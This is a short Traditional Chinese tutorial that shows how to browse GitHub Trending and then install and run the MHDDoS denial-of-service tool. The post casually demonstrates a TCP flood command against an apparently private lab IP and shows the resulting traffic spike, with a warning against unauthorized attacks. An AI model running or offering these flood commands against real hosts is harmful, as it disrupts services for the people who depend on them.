除了自己學程式外，也應該看看世界上的大家都正在做什麼有趣的專案，其中一個快速的方式就是透過 [GitHub Trending](https://github.com/trending) 來看看目前在GitHub上熱門的專案  
<img width="1494" alt="Screen Shot 2022-03-16 at 15 12 24" src="https://user-images.githubusercontent.com/32983347/158535967-7efac5f8-118a-4816-9c84-fc8783640098.png">
如果只想看Python的專案，可以在Language選擇Python  
<img width="1494" alt="Screen Shot 2022-03-16 at 15 13 39" src="https://user-images.githubusercontent.com/32983347/158536226-c1e63ef1-ba1c-4574-9cad-902f4d885975.png">
那我們就來看看這個月最熱門的Python專案 **[MHDDoS](https://github.com/MHProDev/MHDDoS)** 吧  
# MHDDoS
如果想快速了解一個專案在做什麼，最快的方法就是看README.md了。
<img width="798" alt="Screen Shot 2022-03-16 at 15 17 47" src="https://user-images.githubusercontent.com/32983347/158536742-84ae2eeb-5b52-4ba0-af41-ba6c004f83c3.png">
可以看到這個專案是一個提供多達50種DDoS方法的攻擊工具，那我們就來玩玩看吧！  
### 安裝
```bash
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
python3 -m pip install -r requirements.txt
```
### 執行工具  
### **🧨🧨🧨強烈不建議用這個工具進行未經允許的攻擊ㄛ🧨🧨🧨**  
這邊選用TCP Flood Bypass 這個方法攻擊 10.115.197.241 並使用三個thread攻擊30秒
```bash
python3 start.py tcp 10.115.197.241 3 30
```
可以看到被攻擊電腦的網路流量就瞬間上升了
<img width="682" alt="Screen Shot 2022-03-16 at 15 40 16" src="https://user-images.githubusercontent.com/32983347/158540960-865aa6f4-2be9-4b99-a0c4-1524cf978ef9.png">

